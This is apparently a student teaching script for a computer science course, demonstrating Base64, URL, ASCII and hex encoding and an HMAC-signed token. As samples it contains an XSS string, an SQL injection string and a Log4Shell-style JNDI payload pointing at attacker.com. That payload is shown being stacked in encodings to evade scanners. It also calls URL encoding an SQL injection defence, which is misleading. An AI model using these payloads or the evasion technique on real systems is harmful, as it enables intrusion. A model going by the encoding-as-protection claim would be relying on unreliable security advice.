import base64
import urllib.parse
import hashlib
import hmac
import json
import os
from datetime import datetime

# SECTION 1 — BASE64 ENCODING
# ─────────────────────────────────────────────────────────────

def demo_base64():
    print("=" * 60)
    print("SECTION 1: Base64 Encoding")
    print("=" * 60)

    # Basic text encoding
    original = "Hello, this is a secret message!"
    encoded = base64.b64encode(original.encode("utf-8"))
    decoded = base64.b64decode(encoded).decode("utf-8")

    print(f"\nOriginal text  : {original}")
    print(f"Base64 encoded : {encoded.decode()}")
    print(f"Decoded back   : {decoded}")
    print(f"Size overhead  : {len(encoded)} bytes vs {len(original)} bytes "
          f"(+{round((len(encoded)/len(original)-1)*100)}%)")

    # Simulating HTTP Basic Auth header
    username = "student@softwarica.edu.np"
    password = "MyPassword123"
    credentials = f"{username}:{password}"
    auth_token = base64.b64encode(credentials.encode()).decode()
    print(f"\n--- HTTP Basic Auth Header Simulation ---")
    print(f"Credentials    : {credentials}")
    print(f"Authorization  : Basic {auth_token}")
    print(f"NOTE: Base64 is NOT encryption — decode it back easily:")
    print(f"Decoded        : {base64.b64decode(auth_token).decode()}")

    # Base64 encoding a binary file (simulated with bytes)
    fake_binary = os.urandom(12)   # 12 random bytes simulating binary data
    b64_binary = base64.b64encode(fake_binary).decode()
    print(f"\n--- Binary Data (e.g. image attachment) ---")
    print(f"Raw bytes (hex): {fake_binary.hex()}")
    print(f"Base64 encoded : {b64_binary}")

    # Base64URL (used in JWTs / OAuth)
    jwt_payload = {"sub": "user123", "role": "student", "exp": 9999999999}
    payload_json = json.dumps(jwt_payload)
    jwt_b64url = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip("=")
    print(f"\n--- Base64URL (used in JWT tokens / OAuth 2.0) ---")
    print(f"JWT Payload    : {payload_json}")
    print(f"Base64URL      : {jwt_b64url}")
    print(f"Note: '+' replaced with '-', '/' replaced with '_' for URL safety")

    # SECTION 2 — URL ENCODING
# ─────────────────────────────────────────────────────────────

def demo_url_encoding():
    print("\n" + "=" * 60)
    print("SECTION 2: URL (Percent) Encoding")
    print("=" * 60)

    examples = [
        "hello world",
        "search?q=python&sort=asc",
        "price=10&discount=5%",
        "user@email.com",
        "<script>alert('xss')</script>",   # XSS attempt
    ]

    print(f"\n{'Original':<40} {'URL Encoded'}")
    print("-" * 75)
    for text in examples:
        encoded = urllib.parse.quote(text)
        print(f"{text:<40} {encoded}")

    # Decoding back
    encoded_param = "search%3Fq%3Dpython%26sort%3Dasc"
    decoded_param = urllib.parse.unquote(encoded_param)
    print(f"\n--- Decoding a URL-encoded parameter ---")
    print(f"Encoded : {encoded_param}")
    print(f"Decoded : {decoded_param}")

    # Injection risk if NOT encoded
    user_input = "'; DROP TABLE students; --"
    safe = urllib.parse.quote(user_input)
    print(f"\n--- SQL Injection Prevention via Encoding ---")
    print(f"Raw user input (DANGEROUS) : {user_input}")
    print(f"URL encoded (SAFE)         : {safe}")

    # SECTION 3 — ASCII ENCODING
# ─────────────────────────────────────────────────────────────

def demo_ascii():
    print("\n" + "=" * 60)
    print("SECTION 3: ASCII Encoding")
    print("=" * 60)

    text = "Foundation of Computer Science"
    print(f"\nText : {text}")
    print(f"\n{'Char':<6} {'ASCII Decimal':<16} {'ASCII Hex'}")
    print("-" * 35)
    for ch in text:
        print(f"{ch!r:<6} {ord(ch):<16} {ord(ch):#04x}")

    # Showing ASCII limitation: non-Latin characters
    print(f"\n--- ASCII Limitation ---")
    non_ascii = "Namaste: नमस्ते"
    print(f"Text: {non_ascii}")
    try:
        non_ascii.encode("ascii")
    except UnicodeEncodeError as e:
        print(f"ASCII encoding FAILS: {e}")
        utf8_encoded = non_ascii.encode("utf-8")
        print(f"UTF-8 handles it    : {utf8_encoded}")

        # SECTION 4 — HEX ENCODING
# ─────────────────────────────────────────────────────────────

def demo_hex():
    print("\n" + "=" * 60)
    print("SECTION 4: Hexadecimal Encoding")
    print("=" * 60)

    data = "ST4015CMD"
    hex_encoded = data.encode("utf-8").hex()
    hex_decoded = bytes.fromhex(hex_encoded).decode("utf-8")

    print(f"\nOriginal  : {data}")
    print(f"Hex       : {hex_encoded}")
    print(f"Decoded   : {hex_decoded}")
    print(f"Size      : {len(hex_encoded)} bytes vs {len(data)} bytes (100% overhead)")

    # SHA-256 hash shown in hex (typical use case)
    message = "Softwarica College Assignment"
    sha256_hex = hashlib.sha256(message.encode()).hexdigest()
    print(f"\n--- SHA-256 Hash (displayed in Hex) ---")
    print(f"Input   : {message}")
    print(f"SHA-256 : {sha256_hex}")
    print(f"Length  : {len(sha256_hex)} hex chars = 32 bytes")

# SECTION 5 — OBFUSCATION / ENCODING STACKING RISK
# ─────────────────────────────────────────────────────────────

def demo_obfuscation_risk():
    print("\n" + "=" * 60)
    print("SECTION 5: Encoding-Based Obfuscation (Adversarial Risk)")
    print("=" * 60)

    # Simulating how attackers stack encoding to bypass filters
    malicious_payload = "${jndi:ldap://attacker.com/exploit}"  # Log4Shell style
    print(f"\nOriginal payload  : {malicious_payload}")

    # Layer 1: URL encode
    layer1 = urllib.parse.quote(malicious_payload)
    print(f"After URL encode  : {layer1}")

    # Layer 2: Base64 encode on top
    layer2 = base64.b64encode(layer1.encode()).decode()
    print(f"After Base64      : {layer2}")

    # Defender's scanner only checks top layer — misses it
    print(f"\nSimple scanner checks: '{layer2[:30]}...' — NO MATCH for known pattern")
    print(f"Recursive decode reveals: {urllib.parse.unquote(base64.b64decode(layer2).decode())}")
    print(f"\nLesson: Security scanners must recursively decode all layers.")

    # SECTION 6 — SIMULATED BASE64 + HMAC DATA FLOW
# (Represents encoding in a secure web protocol pipeline)
# ─────────────────────────────────────────────────────────────

def demo_secure_pipeline():
    print("\n" + "=" * 60)
    print("SECTION 6: Simulated Secure Data Transmission Pipeline")
    print("         (Base64 encoding + HMAC integrity check)")
    print("=" * 60)

    secret_key = b"softwarica_secret_key_2024"
    message = "Student login: user=asha&token=abc123"

    print(f"\n[SENDER SIDE]")
    print(f"Original message : {message}")

    # Step 1: Base64 encode the payload
    b64_payload = base64.b64encode(message.encode()).decode()
    print(f"Base64 encoded   : {b64_payload}")

    # Step 2: Generate HMAC signature for integrity
    signature = hmac.new(secret_key, b64_payload.encode(), hashlib.sha256).hexdigest()
    print(f"HMAC-SHA256 sig  : {signature[:32]}...")

    # Step 3: Bundle as a simple token
    token = f"{b64_payload}.{signature}"
    print(f"Token sent       : {token[:60]}...")

    print(f"\n[RECEIVER SIDE]")
    parts = token.split(".")
    received_payload, received_sig = parts[0], parts[1]

    # Verify integrity
    expected_sig = hmac.new(secret_key, received_payload.encode(), hashlib.sha256).hexdigest()
    is_valid = hmac.compare_digest(received_sig, expected_sig)
    decoded_message = base64.b64decode(received_payload).decode()

    print(f"Signature valid  : {is_valid}")
    print(f"Decoded message  : {decoded_message}")

# MAIN
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "#" * 60)
    print("  ST4015CMD — Task 1: Encoding Formats Demonstration")
    print("#" * 60)

    demo_base64()
    demo_url_encoding()
    demo_ascii()
    demo_hex()
    demo_obfuscation_risk()
    demo_secure_pipeline()

    print("\n" + "=" * 60)
    print("All demonstrations complete.")
    print("=" * 60)